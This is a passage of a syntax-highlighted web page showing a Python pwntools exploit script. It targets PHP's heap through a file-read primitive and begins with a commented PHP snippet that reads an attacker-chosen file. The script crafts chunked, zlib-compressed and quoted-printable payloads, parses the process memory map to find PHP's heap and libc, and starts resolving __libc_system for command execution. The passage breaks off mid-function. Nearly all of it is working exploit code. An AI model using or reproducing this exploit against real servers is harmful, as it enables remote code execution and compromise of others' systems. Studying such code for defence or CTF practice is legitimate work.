</span><span class="lnt">127
</span><span class="lnt">128
</span><span class="lnt">129
</span><span class="lnt">130
</span><span class="lnt">131
</span><span class="lnt">132
</span><span class="lnt">133
</span><span class="lnt">134
</span><span class="lnt">135
</span><span class="lnt">136
</span><span class="lnt">137
</span><span class="lnt">138
</span><span class="lnt">139
</span><span class="lnt">140
</span><span class="lnt">141
</span><span class="lnt">142
</span><span class="lnt">143
</span><span class="lnt">144
</span><span class="lnt">145
</span><span class="lnt">146
</span><span class="lnt">147
</span><span class="lnt">148
</span><span class="lnt">149
</span><span class="lnt">150
</span><span class="lnt">151
</span><span class="lnt">152
</span><span class="lnt">153
</span><span class="lnt">154
</span><span class="lnt">155
</span><span class="lnt">156
</span><span class="lnt">157
</span><span class="lnt">158
</span><span class="lnt">159
</span><span class="lnt">160
</span><span class="lnt">161
</span><span class="lnt">162
</span><span class="lnt">163
</span><span class="lnt">164
</span><span class="lnt">165
</span><span class="lnt">166
</span><span class="lnt">167
</span><span class="lnt">168
</span><span class="lnt">169
</span><span class="lnt">170
</span><span class="lnt">171
</span><span class="lnt">172
</span><span class="lnt">173
</span><span class="lnt">174
</span><span class="lnt">175
</span><span class="lnt">176
</span><span class="lnt">177
</span><span class="lnt">178
</span><span class="lnt">179
</span><span class="lnt">180
</span><span class="lnt">181
</span><span class="lnt">182
</span><span class="lnt">183
</span><span class="lnt">184
</span><span class="lnt">185
</span><span class="lnt">186
</span><span class="lnt">187
</span><span class="lnt">188
</span><span class="lnt">189
</span><span class="lnt">190
</span><span class="lnt">191
</span><span class="lnt">192
</span><span class="lnt">193
</span><span class="lnt">194
</span><span class="lnt">195
</span><span class="lnt">196
</span><span class="lnt">197
</span><span class="lnt">198
</span><span class="lnt">199
</span><span class="lnt">200
</span><span class="lnt">201
</span><span class="lnt">202
</span><span class="lnt">203
</span><span class="lnt">204
</span><span class="lnt">205
</span><span class="lnt">206
</span><span class="lnt">207
</span><span class="lnt">208
</span><span class="lnt">209
</span><span class="lnt">210
</span><span class="lnt">211
</span><span class="lnt">212
</span><span class="lnt">213
</span><span class="lnt">214
</span><span class="lnt">215
</span><span class="lnt">216
</span><span class="lnt">217
</span><span class="lnt">218
</span><span class="lnt">219
</span><span class="lnt">220
</span><span class="lnt">221
</span><span class="lnt">222
</span><span class="lnt">223
</span><span class="lnt">224
</span><span class="lnt">225
</span><span class="lnt">226
</span><span class="lnt">227
</span><span class="lnt">228
</span><span class="lnt">229
</span><span class="lnt">230
</span><span class="lnt">231
</span><span class="lnt">232
</span><span class="lnt">233
</span><span class="lnt">234
</span><span class="lnt">235
</span><span class="lnt">236
</span><span class="lnt">237
</span><span class="lnt">238
</span><span class="lnt">239
</span><span class="lnt">240
</span><span class="lnt">241
</span><span class="lnt">242
</span><span class="lnt">243
</span><span class="lnt">244
</span><span class="lnt">245
</span><span class="lnt">246
</span><span class="lnt">247
</span><span class="lnt">248
</span><span class="lnt">249
</span><span class="lnt">250
</span><span class="lnt">251
</span><span class="lnt">252
</span><span class="lnt">253
</span><span class="lnt">254
</span><span class="lnt">255
</span><span class="lnt">256
</span><span class="lnt">257
</span><span class="lnt">258
</span><span class="lnt">259
</span><span class="lnt">260
</span><span class="lnt">261
</span><span class="lnt">262
</span><span class="lnt">263
</span><span class="lnt">264
</span><span class="lnt">265
</span><span class="lnt">266
</span><span class="lnt">267
</span><span class="lnt">268
</span><span class="lnt">269
</span><span class="lnt">270
</span><span class="lnt">271
</span><span class="lnt">272
</span><span class="lnt">273
</span><span class="lnt">274
</span><span class="lnt">275
</span><span class="lnt">276
</span><span class="lnt">277
</span><span class="lnt">278
</span><span class="lnt">279
</span><span class="lnt">280
</span><span class="lnt">281
</span><span class="lnt">282
</span><span class="lnt">283
</span><span class="lnt">284
</span><span class="lnt">285
</span><span class="lnt">286
</span><span class="lnt">287
</span><span class="lnt">288
</span><span class="lnt">289
</span><span class="lnt">290
</span><span class="lnt">291
</span><span class="lnt">292
</span><span class="lnt">293
</span><span class="lnt">294
</span><span class="lnt">295
</span><span class="lnt">296
</span><span class="lnt">297
</span><span class="lnt">298
</span><span class="lnt">299
</span><span class="lnt">300
</span><span class="lnt">301
</span><span class="lnt">302
</span><span class="lnt">303
</span><span class="lnt">304
</span><span class="lnt">305
</span><span class="lnt">306
</span><span class="lnt">307
</span><span class="lnt">308
</span><span class="lnt">309
</span><span class="lnt">310
</span><span class="lnt">311
</span><span class="lnt">312
</span><span class="lnt">313
</span><span class="lnt">314
</span><span class="lnt">315
</span><span class="lnt">316
</span><span class="lnt">317
</span><span class="lnt">318
</span><span class="lnt">319
</span><span class="lnt">320
</span><span class="lnt">321
</span><span class="lnt">322
</span><span class="lnt">323
</span><span class="lnt">324
</span><span class="lnt">325
</span><span class="lnt">326
</span><span class="lnt">327
</span><span class="lnt">328
</span><span class="lnt">329
</span><span class="lnt">330
</span><span class="lnt">331
</span><span class="lnt">332
</span><span class="lnt">333
</span><span class="lnt">334
</span><span class="lnt">335
</span><span class="lnt">336
</span><span class="lnt">337
</span><span class="lnt">338
</span><span class="lnt">339
</span><span class="lnt">340
</span><span class="lnt">341
</span><span class="lnt">342
</span><span class="lnt">343
</span><span class="lnt">344
</span><span class="lnt">345
</span><span class="lnt">346
</span><span class="lnt">347
</span><span class="lnt">348
</span><span class="lnt">349
</span><span class="lnt">350
</span><span class="lnt">351
</span><span class="lnt">352
</span><span class="lnt">353
</span><span class="lnt">354
</span><span class="lnt">355
</span><span class="lnt">356
</span><span class="lnt">357
</span><span class="lnt">358
</span><span class="lnt">359
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="c1">#&lt;?php</span>
</span></span><span class="line"><span class="cl"><span class="c1">#$file = $_REQUEST[&#39;file&#39;]; </span>
</span></span><span class="line"><span class="cl"><span class="c1">#$data = file_get_contents($file);</span>
</span></span><span class="line"><span class="cl"><span class="c1">#echo $data;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">dataclasses</span> <span class="kn">import</span> <span class="n">dataclass</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">zlib</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">os</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">binascii</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">HEAP_SIZE</span> <span class="o">=</span> <span class="mi">2</span> <span class="o">*</span> <span class="mi">1024</span> <span class="o">*</span> <span class="mi">1024</span>
</span></span><span class="line"><span class="cl"><span class="n">BUG</span> <span class="o">=</span> <span class="s2">&#34;åŠ„&#34;</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s2">&#34;utf-8&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nd">@dataclass</span>
</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">Region</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;&#34;&#34;A memory region.&#34;&#34;&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">start</span><span class="p">:</span> <span class="nb">int</span>
</span></span><span class="line"><span class="cl">    <span class="n">stop</span><span class="p">:</span> <span class="nb">int</span>
</span></span><span class="line"><span class="cl">    <span class="n">permissions</span><span class="p">:</span> <span class="nb">str</span>
</span></span><span class="line"><span class="cl">    <span class="n">path</span><span class="p">:</span> <span class="nb">str</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nd">@property</span>
</span></span><span class="line"><span class="cl">    <span class="k">def</span> <span class="nf">size</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="bp">self</span><span class="o">.</span><span class="n">stop</span> <span class="o">-</span> <span class="bp">self</span><span class="o">.</span><span class="n">start</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">print_hex</span><span class="p">(</span><span class="n">data</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">hex_string</span> <span class="o">=</span> <span class="n">binascii</span><span class="o">.</span><span class="n">hexlify</span><span class="p">(</span><span class="n">data</span><span class="p">)</span><span class="o">.</span><span class="n">decode</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="n">hex_string</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">chunked_chunk</span><span class="p">(</span><span class="n">data</span><span class="p">:</span> <span class="nb">bytes</span><span class="p">,</span> <span class="n">size</span><span class="p">:</span> <span class="nb">int</span> <span class="o">=</span> <span class="kc">None</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="nb">bytes</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;&#34;&#34;Constructs a chunked representation of the given chunk. If size is given, the
</span></span></span><span class="line"><span class="cl"><span class="s2">    chunked representation has size `size`.
</span></span></span><span class="line"><span class="cl"><span class="s2">    For instance, `ABCD` with size 10 becomes: `0004</span><span class="se">\n</span><span class="s2">ABCD</span><span class="se">\n</span><span class="s2">`.
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;&#34;&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="c1"># The caller does not care about the size: let&#39;s just add 8, which is more than</span>
</span></span><span class="line"><span class="cl">    <span class="c1"># enough</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">size</span> <span class="ow">is</span> <span class="kc">None</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">size</span> <span class="o">=</span> <span class="nb">len</span><span class="p">(</span><span class="n">data</span><span class="p">)</span> <span class="o">+</span> <span class="mi">8</span>
</span></span><span class="line"><span class="cl">    <span class="n">keep</span> <span class="o">=</span> <span class="nb">len</span><span class="p">(</span><span class="n">data</span><span class="p">)</span> <span class="o">+</span> <span class="nb">len</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;</span><span class="se">\n\n</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">size</span> <span class="o">=</span> <span class="sa">f</span><span class="s2">&#34;</span><span class="si">{</span><span class="nb">len</span><span class="p">(</span><span class="n">data</span><span class="p">)</span><span class="si">:</span><span class="s2">x</span><span class="si">}</span><span class="s2">&#34;</span><span class="o">.</span><span class="n">rjust</span><span class="p">(</span><span class="n">size</span> <span class="o">-</span> <span class="n">keep</span><span class="p">,</span> <span class="s2">&#34;0&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">size</span><span class="o">.</span><span class="n">encode</span><span class="p">()</span> <span class="o">+</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\n</span><span class="s2">&#34;</span> <span class="o">+</span> <span class="n">data</span> <span class="o">+</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\n</span><span class="s2">&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">compressed_bucket</span><span class="p">(</span><span class="n">data</span><span class="p">:</span> <span class="nb">bytes</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="nb">bytes</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;&#34;&#34;Returns a chunk of size 0x8000 that, when dechunked, returns the data.&#34;&#34;&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">chunked_chunk</span><span class="p">(</span><span class="n">data</span><span class="p">,</span> <span class="mh">0x8000</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">compress</span><span class="p">(</span><span class="n">data</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="nb">bytes</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;&#34;&#34;Returns data suitable for `zlib.inflate`.
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;&#34;&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="c1"># Remove 2-byte header and 4-byte checksum</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">zlib</span><span class="o">.</span><span class="n">compress</span><span class="p">(</span><span class="n">data</span><span class="p">,</span> <span class="mi">9</span><span class="p">)[</span><span class="mi">2</span><span class="p">:</span><span class="o">-</span><span class="mi">4</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">ptr_bucket</span><span class="p">(</span><span class="o">*</span><span class="n">ptrs</span><span class="p">,</span> <span class="n">size</span><span class="o">=</span><span class="kc">None</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="nb">bytes</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;&#34;&#34;Creates a 0x8000 chunk that reveals pointers after every step has been ran.&#34;&#34;&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">size</span> <span class="ow">is</span> <span class="ow">not</span> <span class="kc">None</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">assert</span> <span class="nb">len</span><span class="p">(</span><span class="n">ptrs</span><span class="p">)</span> <span class="o">*</span> <span class="mi">8</span> <span class="o">==</span> <span class="n">size</span>
</span></span><span class="line"><span class="cl">    <span class="n">bucket</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&#34;&#34;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="nb">map</span><span class="p">(</span><span class="n">p64</span><span class="p">,</span> <span class="n">ptrs</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">    <span class="n">bucket</span> <span class="o">=</span> <span class="n">qpe</span><span class="p">(</span><span class="n">bucket</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">bucket</span> <span class="o">=</span> <span class="n">chunked_chunk</span><span class="p">(</span><span class="n">bucket</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">bucket</span> <span class="o">=</span> <span class="n">chunked_chunk</span><span class="p">(</span><span class="n">bucket</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">bucket</span> <span class="o">=</span> <span class="n">chunked_chunk</span><span class="p">(</span><span class="n">bucket</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">bucket</span> <span class="o">=</span> <span class="n">compressed_bucket</span><span class="p">(</span><span class="n">bucket</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">bucket</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">qpe</span><span class="p">(</span><span class="n">data</span><span class="p">:</span> <span class="nb">bytes</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="nb">bytes</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;&#34;&#34;Emulates quoted-printable-encode.
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;&#34;&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="s2">&#34;&#34;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;=</span><span class="si">{</span><span class="n">x</span><span class="si">:</span><span class="s2">02x</span><span class="si">}</span><span class="s2">&#34;</span> <span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="n">data</span><span class="p">)</span><span class="o">.</span><span class="n">upper</span><span class="p">()</span><span class="o">.</span><span class="n">encode</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">b64</span><span class="p">(</span><span class="n">data</span><span class="p">:</span> <span class="nb">bytes</span><span class="p">,</span> <span class="n">misalign</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="nb">bytes</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">payload</span> <span class="o">=</span> <span class="n">base64</span><span class="o">.</span><span class="n">b64encode</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="ow">not</span> <span class="n">misalign</span> <span class="ow">and</span> <span class="n">payload</span><span class="o">.</span><span class="n">endswith</span><span class="p">(</span><span class="s2">&#34;=&#34;</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="k">raise</span> <span class="ne">ValueError</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;Misaligned: </span><span class="si">{</span><span class="n">data</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">payload</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">_get_region</span><span class="p">(</span><span class="n">regions</span><span class="p">,</span> <span class="o">*</span><span class="n">names</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;&#34;&#34;Returns the first region whose name matches one of the given names.&#34;&#34;&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">region</span> <span class="ow">in</span> <span class="n">regions</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="nb">any</span><span class="p">(</span><span class="n">name</span> <span class="ow">in</span> <span class="n">region</span><span class="o">.</span><span class="n">path</span> <span class="k">for</span> <span class="n">name</span> <span class="ow">in</span> <span class="n">names</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">            <span class="k">break</span>
</span></span><span class="line"><span class="cl">    <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">failure</span><span class="p">(</span><span class="s2">&#34;Unable to locate region&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">region</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">find_main_heap</span><span class="p">(</span><span class="n">regions</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="c1"># Any anonymous RW region with a size superior to the base heap size is a</span>
</span></span><span class="line"><span class="cl">    <span class="c1"># candidate. The heap is at the bottom of the region.</span>
</span></span><span class="line"><span class="cl">    <span class="n">heaps</span> <span class="o">=</span> <span class="p">[</span>
</span></span><span class="line"><span class="cl">        <span class="n">region</span><span class="o">.</span><span class="n">stop</span> <span class="o">-</span> <span class="n">HEAP_SIZE</span> <span class="o">+</span> <span class="mh">0x40</span>
</span></span><span class="line"><span class="cl">        <span class="k">for</span> <span class="n">region</span> <span class="ow">in</span> <span class="nb">reversed</span><span class="p">(</span><span class="n">regions</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">region</span><span class="o">.</span><span class="n">permissions</span> <span class="o">==</span> <span class="s2">&#34;rw-p&#34;</span>
</span></span><span class="line"><span class="cl">        <span class="ow">and</span> <span class="n">region</span><span class="o">.</span><span class="n">size</span> <span class="o">&gt;=</span> <span class="n">HEAP_SIZE</span>
</span></span><span class="line"><span class="cl">        <span class="ow">and</span> <span class="n">region</span><span class="o">.</span><span class="n">stop</span> <span class="o">&amp;</span> <span class="p">(</span><span class="n">HEAP_SIZE</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span>
</span></span><span class="line"><span class="cl">        <span class="ow">and</span> <span class="n">region</span><span class="o">.</span><span class="n">path</span> <span class="o">==</span> <span class="s2">&#34;&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="p">]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="ow">not</span> <span class="n">heaps</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">failure</span><span class="p">(</span><span class="s2">&#34;Unable to find PHP&#39;s main heap in memory&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">first</span> <span class="o">=</span> <span class="n">heaps</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">heaps</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">1</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">heaps</span> <span class="o">=</span> <span class="s2">&#34;, &#34;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="nb">map</span><span class="p">(</span><span class="nb">hex</span><span class="p">,</span> <span class="n">heaps</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;Potential heaps: &#34;</span><span class="o">+</span><span class="n">heaps</span><span class="o">+</span><span class="s2">&#34; (using first)&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;[*]Using &#34;</span><span class="o">+</span><span class="nb">hex</span><span class="p">(</span><span class="n">first</span><span class="p">)</span><span class="o">+</span><span class="s2">&#34; as heap&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">first</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">get_regions</span><span class="p">(</span><span class="n">maps_path</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;&#34;&#34;Obtains the memory regions of the PHP process by querying /proc/self/maps.&#34;&#34;&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="n">f</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s1">&#39;maps&#39;</span><span class="p">,</span><span class="s1">&#39;rb&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">maps</span> <span class="o">=</span> <span class="n">f</span><span class="o">.</span><span class="n">read</span><span class="p">()</span><span class="o">.</span><span class="n">decode</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="n">PATTERN</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">compile</span><span class="p">(</span>
</span></span><span class="line"><span class="cl">        <span class="sa">r</span><span class="s2">&#34;^([a-f0-9]+)-([a-f0-9]+)\b&#34;</span> <span class="sa">r</span><span class="s2">&#34;.*&#34;</span> <span class="sa">r</span><span class="s2">&#34;\s([-rwx]</span><span class="si">{3}</span><span class="s2">[ps])\s&#34;</span> <span class="sa">r</span><span class="s2">&#34;(.*)&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">regions</span> <span class="o">=</span> <span class="p">[]</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">region</span> <span class="ow">in</span> <span class="n">maps</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s2">&#34;</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="c1">#print(region)</span>
</span></span><span class="line"><span class="cl">        <span class="k">match</span> <span class="o">=</span> <span class="n">PATTERN</span><span class="o">.</span><span class="k">match</span><span class="p">(</span><span class="n">region</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="k">match</span> <span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">start</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="k">match</span><span class="o">.</span><span class="n">group</span><span class="p">(</span><span class="mi">1</span><span class="p">),</span> <span class="mi">16</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="n">stop</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="k">match</span><span class="o">.</span><span class="n">group</span><span class="p">(</span><span class="mi">2</span><span class="p">),</span> <span class="mi">16</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="n">permissions</span> <span class="o">=</span> <span class="k">match</span><span class="o">.</span><span class="n">group</span><span class="p">(</span><span class="mi">3</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="n">path</span> <span class="o">=</span> <span class="k">match</span><span class="o">.</span><span class="n">group</span><span class="p">(</span><span class="mi">4</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="s2">&#34;/&#34;</span> <span class="ow">in</span> <span class="n">path</span> <span class="ow">or</span> <span class="s2">&#34;[&#34;</span> <span class="ow">in</span> <span class="n">path</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="n">path</span> <span class="o">=</span> <span class="n">path</span><span class="o">.</span><span class="n">rsplit</span><span class="p">(</span><span class="s2">&#34; &#34;</span><span class="p">,</span> <span class="mi">1</span><span class="p">)[</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">            <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="n">path</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span>
</span></span><span class="line"><span class="cl">            <span class="n">current</span> <span class="o">=</span> <span class="n">Region</span><span class="p">(</span><span class="n">start</span><span class="p">,</span> <span class="n">stop</span><span class="p">,</span> <span class="n">permissions</span><span class="p">,</span> <span class="n">path</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="n">regions</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">current</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;[*]Unable to parse memory mappings&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;[*]Got &#34;</span><span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">regions</span><span class="p">))</span> <span class="o">+</span> <span class="s2">&#34; memory regions&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">regions</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">get_symbols_and_addresses</span><span class="p">(</span><span class="n">regions</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1"># PHP&#39;s heap</span>
</span></span><span class="line"><span class="cl">    <span class="n">heap</span> <span class="o">=</span> <span class="n">find_main_heap</span><span class="p">(</span><span class="n">regions</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1"># Libc</span>
</span></span><span class="line"><span class="cl">    <span class="n">libc_info</span> <span class="o">=</span> <span class="n">_get_region</span><span class="p">(</span><span class="n">regions</span><span class="p">,</span> <span class="s2">&#34;libc-&#34;</span><span class="p">,</span> <span class="s2">&#34;libc.so&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">heap</span><span class="p">,</span> <span class="n">libc_info</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">build_exploit_path</span><span class="p">(</span><span class="n">libc</span><span class="p">,</span> <span class="n">heap</span><span class="p">,</span> <span class="n">sleep</span><span class="p">,</span> <span class="n">padding</span><span class="p">,</span> <span class="n">cmd</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">LIBC</span> <span class="o">=</span> <span class="n">libc</span>
</span></span><span class="line"><span class="cl">    <span class="n">ADDR_EMALLOC</span> <span class="o">=</span> <span class="n">LIBC</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s2">&#34;__libc_malloc&#34;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">    <span class="n">ADDR_EFREE</span> <span class="o">=</span> <span class="n">LIBC</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s2">&#34;__libc_system&#34;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">    <span class="n">ADDR_EREALLOC</span> <span class="o">=</span> <span class="n">LIBC</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s2">&#34;__libc_realloc&#34;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">    <span class="n">ADDR_HEAP</span> <span class="o">=</span> <span class="n">heap</span>
</span></span><span class="line"><span class="cl">    <span class="n">ADDR_FREE_SLOT</span> <span class="o">=</span> <span class="n">ADDR_HEAP</span> <span class="o">+</span> <span class="mh">0x20</span>
</span></span><span class="line"><span class="cl">    <span class="n">ADDR_CUSTOM_HEAP</span> <span class="o">=</span> <span class="n">ADDR_HEAP</span> <span class="o">+</span> <span class="mh">0x0168</span>
</span></span><span class="line"><span class="cl">
